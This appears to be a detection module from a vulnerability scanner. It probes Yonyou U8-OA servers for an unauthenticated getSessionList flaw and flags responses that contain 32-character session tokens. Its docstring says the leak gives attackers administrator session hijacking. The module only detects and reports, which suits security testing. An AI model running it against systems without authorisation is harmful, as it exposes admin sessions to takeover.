#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests
import re

def u8_oa_getsession_scan(self, url):
    '''  通过该漏洞, 攻击者可以获取数据库中管理员的账户信息以及session, 可利用session登录相关账号 '''
    vul_info = {}
    vul_info['app_name'] = self.app_name + 'U8-OA'
    vul_info['vul_type'] = 'DSinfo'
    vul_info['vul_id'] = 'Yonyou-u8-getSessionList-unAuth'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    # headers = self.headers.copy()
    # headers.update(vul_info['headers'])

    for payload in self.yonyou_u8_oa_getsession_payloads:
        path = payload['path']
        target = url + path

        vul_info['path'] = path
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=self.headers,
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            session_re = r'([0-9A-Z]{32})+'
            if (re.search(session_re, res.text, re.M|re.U)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
